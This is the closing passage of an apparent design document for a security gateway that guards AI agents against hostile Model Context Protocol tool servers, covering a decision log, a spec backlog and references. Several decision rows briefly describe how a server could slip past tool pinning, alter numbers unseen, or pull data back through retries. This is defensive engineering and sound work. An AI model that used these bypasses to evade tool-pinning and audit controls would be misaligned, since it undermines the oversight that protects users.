| 13 | OPA/Rego with default-deny combiner and gateway-derived attributes | Expressive, testable, widely recognized | [ADR-0004](docs/adr/0004-policy-engine.md) | 2026-11-26 |
| 14 | Support 2026-07-28 (primary) and 2025-11-25 (compatibility); detect the revision per message; no translation; reject unsupported revisions in `enforce` | 2026-07-28 removed the handshake and server-initiated requests; both revisions will be in use at launch | [ADR-0003](docs/adr/0003-implementation-language.md) (amended) | 2026-11-26 |
| 15 | Fingerprint the whole tool object (and server metadata), with an explicit exclude list that is empty by default | Fields outside a fixed include list would bypass pinning (T-18) | — | 2026-11-26 |
| 16 | Inventory all model-visible channels (§4.5); pin and strip server metadata in v0.1; analyze and audit prompts, resources, and MRTR requests; state the rest as accepted risks AR-8, AR-9 | Closes the `instructions` gap without pinning every channel in the MVP; keeps the §1.1 claim honest | — | 2026-11-26 |
| 17 | An MRTR retry is a new `tools/call` through the full pipeline | The retry carries server-requested data back to the server (T-16) | — | 2026-11-26 |
| 18 | Policy input carries gateway-supplied server identity and pin status; derived attributes only for configured, pinned argument roles; OPA network and runtime built-ins removed | Tool names and argument meanings are server-controlled; policies must not make network calls (T-19) | [ADR-0004](docs/adr/0004-policy-engine.md) (amended) | 2026-11-26 |
| 19 | No interactive prompts in v0.1; `ask` = deny with an `approval_required` audit record | GUI clients have no terminal; terminal agents share theirs (T-12) | [ADR-0004](docs/adr/0004-policy-engine.md) (amended) | 2026-11-26 |
| 20 | Suite asserts the control that fired; multi-control scenarios run once per control; plain and secret-shaped canaries; `warn` = detected, `enforce` = blocked | Stops tests passing for the wrong reason | — | 2026-11-26 |
| 21 | PR CI is Linux only; macOS on merges to `main` and releases. *Amended v0.10:* the repo is public, so Linux and macOS both run on every PR at no cost | macOS runners cost about 10× Linux on a private repo; on a public repo standard runners are free (C-4) | — | 2026-11-26 |
| 22 | NFR-004 gated on an in-process benchmark; end-to-end latency reported only | Shared runners are too noisy for an end-to-end latency gate (NFR-008) | — | 2026-11-26 |
| 23 | v0.1 is 8 specs; interactive `ask` and entropy detection cut; ordered cut line in §12.1 | About 6–8 months at one review per week | — | 2026-11-26 |
| 24 | Lossless re-serialization: exact numbers, unknown fields kept, lone surrogates rejected; round-trip property and fuzz tests | Re-serializing through floats or dropping fields would corrupt IDs and break transparency (FR-028) | — | 2026-11-26 |
| 25 | Embedded baseline **allow** for approved tools, on by default. *Amended in review of design 03:* the baseline contains only the allow; secret and MRTR blocks moved to gateway checks (decisions 31 and 36), and restrictions are deny rules (decision 35) | Pure default-deny would block every call until the operator writes Rego, so a first run would be useless (§5.6) | — | 2026-11-26 |
| 26 | Server identity = operator `--server-id` + `command_digest`; the server's own `serverInfo` is never used for identity; warn on unpinned `npx`/`uvx` packages and undigested images; a changed digest needs re-approval | `serverInfo` is self-reported; the digest is the best identity a stdio gateway can establish (§5.3) | — | 2026-11-26 |
| 27 | Fingerprints use JCS key order and string rules but keep exact number literals (a documented deviation from RFC 8785) | Strict JCS maps distinct large integers to the same double, which would let a server change a number unseen (§5.3) | — | 2026-11-26 |
| 28 | Hidden tool → JSON-RPC `-32602` "Unknown tool"; policy deny → tool result with `isError: true`; unsupported revision → `-32022`; limits → `-32010` | Matches the MCP tools spec's split between protocol errors and tool execution errors; hiding does not leak existence; the model gets actionable feedback on denies (§6.6) | — | 2026-11-26 |
| 29 | Replay client sends raw scripted JSON-RPC; the Go SDK is used only in lab servers | Exact control of revision and message bytes (needed for FR-028 and FR-036 tests); no SDK version pin needed for compatibility (§5.9) | [ADR-0003](docs/adr/0003-implementation-language.md) (amended) | 2026-11-26 |
| 30 | First signed release (cosign keyless, SBOM, GitHub attestations) is v0.1 at M3; the repo is public as of 2026-11-26 | Attestations need a public repo on the Free plan; keyless signing publishes repo identity to a public log (§11) | — | 2026-11-26 |
| 31 | Secrets: requests denied by default **by the secrets interceptor, independent of policy** (amended in review); results redacted with a visible `[REDACTED:<rule>]` marker | Silently changing arguments alters tool behavior; the model should see that something was removed; the block must not depend on which policy files are loaded (§5.5) | — | 2026-11-26 |
| 32 | OPA capabilities: remove every built-in OPA marks nondeterministic, derived from the pinned OPA version's capabilities file | One mechanical rule removes network, environment, and nondeterminism, with no hand-kept list to go stale (§5.6) | [ADR-0004](docs/adr/0004-policy-engine.md) (amended) | 2026-11-26 |
| 33 | If the audit log can't be written in `enforce` mode, every call is denied | Nothing may proceed unrecorded (§5.8, §9) | — | 2026-11-26 |
| 34 | No hot reload of config or policies in v0.1 | Restart is cheap (the client relaunches the server); avoids reload races (§9) | — | 2026-11-26 |
| 35 | Policy model: allow by pin, restrict with `deny` rules; blocks with no allow are recorded as `policy:default-deny` | An `allow`-based restriction can't win against the baseline allow, and a default-deny block had no control ID for attribution (design 03 review, B1) | [ADR-0004](docs/adr/0004-policy-engine.md) (amended) | 2026-11-26 |
| 36 | MRTR checks (secrets, unsolicited, unmatched) apply to `tools/call`, `prompts/get`, and `resources/read` retries, enforced by the gateway before policy | All three methods can return `input_required` under 2026-07-28; checking only `tools/call` left M-9 open (review S1) | — | 2026-11-26 |
| 37 | Pin re-checks are rate-limited by `pin_recheck_min_age` (default 30 s) | A tiny `ttlMs` or a stream of change notifications must not force a re-check per call (review S5) | — | 2026-11-26 |
| 38 | Audit records store keyed HMAC-SHA-256 argument values, not plain hashes | Plain hashes of short arguments can be reversed by guessing (review N3) | — | 2026-11-26 |

### 14.2 Open questions
None block v0.1. Q1 (deny format) is closed by §6.6, and Q2 (pin store and server identity) by §5.3. Open for later versions:
- v0.2: whether the approval broker should answer clients with its own `input_required` elicitation (§5.10)
- v0.3: classifier model, datasets, and licenses (§8)

## 15. Spec backlog (draft)
v0.1 is planned as **8 specs** (merged from 10 in v0.8 to fit the review budget, §12.1).

| Spec | Title | Traces to | Milestone |
|---|---|---|---|
| 001 | Attack suite: lab scenarios L-01…L-08, manifests, observation log, lab guard, replay client (both revisions), runner, CI skeleton and results table | FR-001…FR-005, FR-008, NFR-001, NFR-002, NFR-003, NFR-008, NFR-009, NFR-010 | M1 |
| 002 | stdio proxy: strict JSON-RPC, request IDs, revision handling; hash-chained audit log + `audit verify/tail`; terminal-safe output | FR-020, FR-026, FR-028, FR-029, FR-031, FR-036, NFR-004, NFR-006, NFR-007, NFR-013, NFR-014 | M1 |
| 003 | Fingerprinting (tools + server metadata) + pin store + modes + verify-before-call | FR-021, FR-030, FR-033 | M2 |
| 004 | Static analyzers (first 4) on all channels + detection corpora | FR-006, FR-022, FR-034 | M2 |
| 005 | `tools` CLI (list/diff/approve/reject) | FR-027 (reuses FR-029 from spec 002) | M2 |
| 006 | Policy engine + argument roles + MRTR retry checks + `policy test` | FR-023, FR-024, FR-035, NFR-005 | M3 |
| 007 | Secret detection + redaction | FR-025 | M3 |
| 008 | One-command demo + release pipeline (SBOM, signing, vuln scan) | FR-007, NFR-011, NFR-012, NFR-015 | M3 |
| 009 | Streamable HTTP + multi-server aggregation | FR-040, FR-041 | M4 |
| 010 | Taint tracker + taint-aware policy | FR-042 | M4 |
| 011 | Approval broker | FR-043 | M4 |
| 012 | Injection classifier tier | FR-044 | M5 |
| 013 | OTel + OCSF exporters | FR-045 | M5 |
| 014 | Optional live-model mode | FR-046 | M5 |

## Appendix: References
- Model Context Protocol specification, revision 2026-07-28: modelcontextprotocol.io/specification/2026-07-28; source files (changelog, `schema/2026-07-28/schema.ts`, stdio transport, MRTR pattern, `server/discover`) checked in the specification repository github.com/modelcontextprotocol/modelcontextprotocol on 2026-11-26
- MCP blog, "The 2026-07-28 Specification": blog.modelcontextprotocol.io/posts/2026-07-28
- Model Context Protocol specification, revision 2025-11-25 (compatibility target)
- Official MCP Go SDK: github.com/modelcontextprotocol/go-sdk (v1.7.0)
- Open Policy Agent: openpolicyagent.org
- OWASP GenAI Security Project: Top 10 for LLM Applications 2026; Top 10 for Agentic Applications (Dec 2025): genai.owasp.org
- Cloud Security Alliance, *MCP Tool Poisoning and Rug Pull Attacks* whitepaper (May 2026)
- arXiv 2603.22489: study of tool-poisoning defenses in MCP clients (2026)
- Debenedetti et al., *Defeating Prompt Injections by Design* (CaMeL), arXiv 2503.18813, 2025
- Simon Willison, "The lethal trifecta for AI agents" (2025)
- RFC 8785 JSON Canonicalization Scheme; JSON-RPC 2.0 specification
- MITRE ATLAS: atlas.mitre.org
